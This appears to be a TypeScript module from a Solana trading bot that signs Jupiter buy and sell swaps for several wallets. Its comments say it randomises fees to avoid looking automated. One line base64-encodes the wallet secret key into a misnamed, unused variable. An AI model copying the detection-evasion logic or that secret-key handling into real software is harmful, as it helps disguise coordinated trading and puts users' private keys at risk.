
import {
  PublicKey,
  Keypair,
  Connection,
  VersionedTransaction,
  TransactionMessage,
  ComputeBudgetProgram
} from '@solana/web3.js';
import { PRIORITY_FEE_LAMPORTS_HIGH, PRIORITY_FEE_LAMPORTS_MEDIUM, PRIORITY_FEE_LAMPORTS_LOW } from '../constants/constants';

const SLIPPAGE = 9900 // 99% slippage - maximum to avoid error 6001 when multiple wallets sell simultaneously

// Helper function to fetch with timeout and retry
// Enhanced with better error handling and diagnostics
const fetchWithTimeout = async (url: string, options: RequestInit = {}, timeoutMs: number = 30000, retries: number = 10): Promise<Response> => {
  let lastError: any = null;
  
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      // Create AbortController for timeout
      const controller = new AbortController();
      const timeoutId = setTimeout(() => {
        controller.abort();
      }, timeoutMs);
      
      try {
        // Use native fetch (Node 18+ has built-in fetch, or use undici)
        const response = await fetch(url, {
          ...options,
          signal: controller.signal,
          // Add headers for better compatibility
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            ...(options.headers || {})
          }
        });
        
        clearTimeout(timeoutId);
        
        // Check if response is OK
        if (!response.ok) {
          const errorText = await response.text().catch(() => 'No error details');
          throw new Error(`HTTP ${response.status}: ${response.statusText} - ${errorText.slice(0, 200)}`);
        }
        
        return response;
      } catch (fetchError: any) {
        clearTimeout(timeoutId);
        throw fetchError;
      }
    } catch (error: any) {
      lastError = error;
      
      const errorMsg = error.message || String(error);
      const isNetworkError = errorMsg.includes('fetch failed') || 
                            errorMsg.includes('ECONNREFUSED') || 
                            errorMsg.includes('ENOTFOUND') ||
                            errorMsg.includes('ETIMEDOUT') ||
                            errorMsg.includes('aborted');
      
      // If it's the last attempt, throw the error with more details
      if (attempt === retries - 1) {
        if (isNetworkError) {
          throw new Error(`Network error after ${retries} attempts: ${errorMsg}. Check your internet connection, firewall, or DNS settings.`);
        }
        throw error;
      }
      
      // Wait before retry (exponential backoff: 500ms, 1s, 2s, 4s, etc.)
      const backoffDelay = Math.min(Math.pow(2, attempt) * 500, 5000);
      if (attempt > 0) {
        // Only log after first attempt to avoid spam
        console.log(`   ⚠️  Retry ${attempt + 1}/${retries} in ${backoffDelay}ms... (${errorMsg.slice(0, 60)})`);
      }
      await new Promise(resolve => setTimeout(resolve, backoffDelay));
    }
  }
  
  // Should never reach here, but just in case
  throw lastError || new Error('Fetch failed after retries');
};

export const getBuyTxWithJupiter = async (wallet: Keypair, baseMint: PublicKey, amount: number, priorityFeeLamports?: number, originalFeeLevel?: 'low' | 'medium' | 'high') => {
  // Use provided priority fee or add random variation to avoid looking botted
  // If no fee provided, use base fee + random variation (0-50,000 lamports)
  // Jupiter defaults to ~800k lamports (0.0008 SOL), so we vary between 0-50k to stay low but varied
  let feeToUse: number
  if (priorityFeeLamports !== undefined) {
    // Add proportional variation based on fee level:
    // - HIGH fees (5M+): ±2% variation (still very high, just slightly varied)
    // - MEDIUM fees (500k+): ±5% variation (still medium-high, slightly varied)
    // - LOW fees (<500k): ±50k lamports flat variation (low but varied)
    if (priorityFeeLamports >= 5_000_000) {
      // HIGH: ±2% variation
      const variationPercent = (Math.random() * 0.04 - 0.02) // -2% to +2%
      feeToUse = Math.floor(priorityFeeLamports * (1 + variationPercent))
    } else if (priorityFeeLamports >= 500_000) {
      // MEDIUM: ±5% variation
      const variationPercent = (Math.random() * 0.10 - 0.05) // -5% to +5%
      feeToUse = Math.floor(priorityFeeLamports * (1 + variationPercent))
    } else {
      // LOW: Flat 0-50k variation (for very low fees)
      const variation = Math.floor(Math.random() * 50000) // 0-50,000 lamports random variation
      feeToUse = priorityFeeLamports + variation
    }
  } else {
    const baseFee = PRIORITY_FEE_LAMPORTS_LOW || 0
    const variation = Math.floor(Math.random() * 50000) // 0-50,000 lamports random variation
    feeToUse = baseFee + variation
  }
  try {
    const publicKey = btoa(wallet.secretKey.toString())
    // Use new Jupiter API endpoint (old quote-api.jup.ag was deprecated)
    const quoteResponse = await (
      await fetch(
        `https://lite-api.jup.ag/swap/v1/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${baseMint.toBase58()}&amount=${amount}&slippageBps=${SLIPPAGE}`
      )
    ).json();

    // get serialized transactions for the swap
    const { swapTransaction } = await (
      await fetch("https://lite-api.jup.ag/swap/v1/swap", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          quoteResponse,
          userPublicKey: wallet.publicKey.toString(),
          wrapAndUnwrapSol: true,
          dynamicComputeUnitLimit: true,
          prioritizationFeeLamports: feeToUse // Use provided priority fee or default to LOW
        }),
      })
    ).json();

    // deserialize the transaction
    const swapTransactionBuf = Buffer.from(swapTransaction, "base64");
    var transaction = VersionedTransaction.deserialize(swapTransactionBuf);

    // Override Jupiter's compute budget instructions with our varied fee to avoid looking botted
    // Jupiter defaults to ~800k lamports (0.0008 SOL), so we override with varied fees
    try {
      const message = transaction.message;
      const decompiledMessage = TransactionMessage.decompile(message);
      
      // Remove existing compute budget instructions
      decompiledMessage.instructions = decompiledMessage.instructions.filter(
        (ix) => !(ix.programId.equals(ComputeBudgetProgram.programId))
      );
      
      // Add our own compute budget instructions with variation based on priority level
      // Convert priority fee to compute unit price: priorityFee / computeUnits = microLamports per unit
      // Use 200k compute units (Jupiter's default)
      let computeUnitPrice: number
      if (originalFeeLevel === 'high') {
        // HIGH: 5M lamports / 200k units = 25 microLamports per unit
        // Add variation: 20-30 microLamports (equivalent to 4-6M lamports total priority fee)
        computeUnitPrice = 20 + Math.floor(Math.random() * 11) // 20-30 microLamports
        console.log(`[Jupiter Buy] HIGH priority: ${computeUnitPrice} microLamports/unit = ${(200_000 * computeUnitPrice / 1e9).toFixed(6)} SOL priority fee`)
      } else if (originalFeeLevel === 'medium') {
        // MEDIUM: 500k lamports / 200k units = 2.5 microLamports per unit
        // Add variation: 2-4 microLamports (equivalent to 400k-800k lamports total priority fee)
        computeUnitPrice = 2 + Math.floor(Math.random() * 3) // 2-4 microLamports
        console.log(`[Jupiter Buy] MEDIUM priority: ${computeUnitPrice} microLamports/unit = ${(200_000 * computeUnitPrice / 1e9).toFixed(6)} SOL priority fee`)
      } else {
        // LOW: Minimal or no priority fee
        // Add variation: 0-5 microLamports (equivalent to 0-1M lamports total, but usually much lower)
        computeUnitPrice = Math.floor(Math.random() * 6) // 0-5 microLamports
        console.log(`[Jupiter Buy] LOW priority: ${computeUnitPrice} microLamports/unit = ${(200_000 * computeUnitPrice / 1e9).toFixed(6)} SOL priority fee`)
      }
      decompiledMessage.instructions.unshift(
        ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: computeUnitPrice })
      );
      
      // Rebuild transaction with modified instructions
      const modifiedMessage = new TransactionMessage(decompiledMessage).compileToV0Message();
      transaction = new VersionedTransaction(modifiedMessage);
      
      console.log(`[Jupiter Buy] Overrode compute budget: ${computeUnitPrice} microLamports/unit (${(200_000 * computeUnitPrice / 1e9).toFixed(9)} SOL total)`)
    } catch (error: any) {
      console.warn(`[Jupiter Buy] Failed to override compute budget (using Jupiter's default): ${error.message}`)
      // Continue with Jupiter's transaction if override fails
    }

    transaction.sign([wallet]);
    return transaction
  } catch (error) {
    console.log("Failed to get buy transaction")
    return null
  }
};


export const getSellTxWithJupiter = async (wallet: Keypair, baseMint: PublicKey, amount: string, priorityFeeLamports?: number, originalFeeLevel?: 'low' | 'medium' | 'high') => {
  try {
    // Use provided priority fee or add random variation to avoid looking botted
    // If no fee provided, use base fee + random variation (0-50,000 lamports)
    // Jupiter defaults to ~800k lamports (0.0008 SOL), so we vary between 0-50k to stay low but varied
    // This makes each trade have slightly different fees (looks more natural)
    let feeToUse: number
    if (priorityFeeLamports !== undefined) {
      // Add proportional variation based on fee level:
      // - HIGH fees (5M+): ±2% variation (still very high, just slightly varied)
      // - MEDIUM fees (500k+): ±5% variation (still medium-high, slightly varied)
      // - LOW fees (<500k): ±50k lamports flat variation (low but varied)
      if (priorityFeeLamports >= 5_000_000) {
        // HIGH: ±2% variation
        const variationPercent = (Math.random() * 0.04 - 0.02) // -2% to +2%
        feeToUse = Math.floor(priorityFeeLamports * (1 + variationPercent))
      } else if (priorityFeeLamports >= 500_000) {
        // MEDIUM: ±5% variation
        const variationPercent = (Math.random() * 0.10 - 0.05) // -5% to +5%
        feeToUse = Math.floor(priorityFeeLamports * (1 + variationPercent))
      } else {
        // LOW: Flat 0-50k variation (for very low fees)
        const variation = Math.floor(Math.random() * 50000) // 0-50,000 lamports random variation
        feeToUse = priorityFeeLamports + variation
      }
    } else {
      const baseFee = PRIORITY_FEE_LAMPORTS_LOW || 0
      const variation = Math.floor(Math.random() * 50000) // 0-50,000 lamports random variation
      feeToUse = baseFee + variation
    }
    
    // Get quote from Jupiter with timeout and retry (increased retries for network resilience)
    // Using new Jupiter API endpoint (old quote-api.jup.ag was deprecated)
    const quoteUrl = `https://lite-api.jup.ag/swap/v1/quote?inputMint=${baseMint.toBase58()}&outputMint=So11111111111111111111111111111111111111112&amount=${amount}&slippageBps=${SLIPPAGE}`
    const quoteResponseData = await fetchWithTimeout(quoteUrl, {}, 30000, 10);
    const quoteResponse = await quoteResponseData.json();
    
    // Check for quote errors
    if (quoteResponse.error) {
      console.log(`[Jupiter Sell] Quote error for ${baseMint.toBase58()}: ${JSON.stringify(quoteResponse.error)}`)
      console.log(`[Jupiter Sell] Amount requested: ${amount}`)
      return null
    }
    
    if (!quoteResponse || !quoteResponse.outAmount) {
      console.log(`[Jupiter Sell] No quote available for ${baseMint.toBase58()}, amount: ${amount}`)
      console.log(`[Jupiter Sell] Quote response:`, JSON.stringify(quoteResponse).substring(0, 500))
      return null
    }
    
    console.log(`[Jupiter Sell] Got quote for ${baseMint.toBase58()}: ${quoteResponse.outAmount} SOL (amount: ${amount})`)

    // get serialized transactions for the swap with timeout and retry (increased retries for network resilience)
    console.log(`[Jupiter Sell] Requesting swap transaction for ${baseMint.toBase58()}...`)
    const swapResponse = await fetchWithTimeout("https://lite-api.jup.ag/swap/v1/swap", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        quoteResponse,
        userPublicKey: wallet.publicKey.toString(),
        wrapAndUnwrapSol: true,
        dynamicComputeUnitLimit: true,
        prioritizationFeeLamports: feeToUse // Use provided fee with variation to avoid looking botted
      }),
    }, 20000, 5);
    
    if (!swapResponse.ok) {
      const errorText = await swapResponse.text().catch(() => 'No error details');
      console.error(`[Jupiter Sell] HTTP error ${swapResponse.status} for ${baseMint.toBase58()}: ${errorText.substring(0, 500)}`)
      return null
    }
    
    const swapData = await swapResponse.json();
    
    // Check for swap errors
    if (swapData.error) {
      console.error(`[Jupiter Sell] Swap error for ${baseMint.toBase58()}: ${JSON.stringify(swapData.error)}`)
      console.error(`[Jupiter Sell] Amount: ${amount}, Quote outAmount: ${quoteResponse.outAmount}`)
      return null
    }
    
    if (!swapData.swapTransaction) {
      console.error(`[Jupiter Sell] No swap transaction returned from Jupiter for ${baseMint.toBase58()}`)
      console.error(`[Jupiter Sell] Swap response keys:`, Object.keys(swapData))
      console.error(`[Jupiter Sell] Swap response:`, JSON.stringify(swapData).substring(0, 1000))
      return null
    }
    
    console.log(`[Jupiter Sell] ✅ Got swap transaction for ${baseMint.toBase58()}`)

    // deserialize the transaction
    const swapTransactionBuf = Buffer.from(swapData.swapTransaction, "base64");
    var transaction = VersionedTransaction.deserialize(swapTransactionBuf);

    // Override Jupiter's compute budget instructions with our varied fee to avoid looking botted
    // Jupiter defaults to ~800k lamports (0.0008 SOL), so we override with varied fees
    try {
      const message = transaction.message;
      const decompiledMessage = TransactionMessage.decompile(message);
      
      // Remove existing compute budget instructions
      decompiledMessage.instructions = decompiledMessage.instructions.filter(
        (ix) => !(ix.programId.equals(ComputeBudgetProgram.programId))
      );
      
      // Add our own compute budget instructions with variation based on priority level
      // Convert priority fee to compute unit price: priorityFee / computeUnits = microLamports per unit
      // Use 200k compute units (Jupiter's default)
      let computeUnitPrice: number
      if (originalFeeLevel === 'high') {
        // HIGH: 5M lamports / 200k units = 25 microLamports per unit
        // Add variation: 20-30 microLamports (equivalent to 4-6M lamports total priority fee)
        computeUnitPrice = 20 + Math.floor(Math.random() * 11) // 20-30 microLamports
        console.log(`[Jupiter Sell] HIGH priority: ${computeUnitPrice} microLamports/unit = ${(200_000 * computeUnitPrice / 1e9).toFixed(6)} SOL priority fee`)
      } else if (originalFeeLevel === 'medium') {
        // MEDIUM: 500k lamports / 200k units = 2.5 microLamports per unit
        // Add variation: 2-4 microLamports (equivalent to 400k-800k lamports total priority fee)
        computeUnitPrice = 2 + Math.floor(Math.random() * 3) // 2-4 microLamports
        console.log(`[Jupiter Sell] MEDIUM priority: ${computeUnitPrice} microLamports/unit = ${(200_000 * computeUnitPrice / 1e9).toFixed(6)} SOL priority fee`)
      } else {
        // LOW: Minimal or no priority fee
        // Add variation: 0-5 microLamports (equivalent to 0-1M lamports total, but usually much lower)
        computeUnitPrice = Math.floor(Math.random() * 6) // 0-5 microLamports
        console.log(`[Jupiter Sell] LOW priority: ${computeUnitPrice} microLamports/unit = ${(200_000 * computeUnitPrice / 1e9).toFixed(6)} SOL priority fee`)
      }
      decompiledMessage.instructions.unshift(
        ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: computeUnitPrice })
      );
      
      // Rebuild transaction with modified instructions
      const modifiedMessage = new TransactionMessage(decompiledMessage).compileToV0Message();
      transaction = new VersionedTransaction(modifiedMessage);
      
      console.log(`[Jupiter Sell] Overrode compute budget: ${computeUnitPrice} microLamports/unit (${(200_000 * computeUnitPrice / 1e9).toFixed(9)} SOL total)`)
    } catch (error: any) {
      console.warn(`[Jupiter Sell] Failed to override compute budget (using Jupiter's default): ${error.message}`)
      // Continue with Jupiter's transaction if override fails
    }

    transaction.sign([wallet]);
    return transaction
  } catch (error: any) {
    const errorMsg = error.message || String(error);
    
    // More specific error messages with diagnostics
    if (errorMsg.includes('fetch failed') || errorMsg.includes('ECONNREFUSED') || errorMsg.includes('ENOTFOUND')) {
      console.log(`⚠️  Network error connecting to Jupiter API: ${errorMsg}`)
      console.log(`   Possible causes:`)
      console.log(`   1. DNS resolution failure - check if quote-api.jup.ag resolves`)
      console.log(`   2. Firewall/proxy blocking HTTPS connections`)
      console.log(`   3. Jupiter API endpoint may be deprecated or changed`)
      console.log(`   4. Network connectivity issue`)
      console.log(`   Try: ping quote-api.jup.ag or check https://status.jup.ag`)
    } else if (errorMsg.includes('aborted') || errorMsg.includes('timeout')) {
      console.log(`⚠️  Request timeout to Jupiter API: ${errorMsg}`)
      console.log(`   The API may be slow or overloaded`)
    } else {
      console.log(`Failed to get sell transaction: ${errorMsg}`)
    }
    
    if (error.stack && !errorMsg.includes('fetch failed')) {
      console.log(`Stack: ${error.stack}`)
    }
    return null
  }
};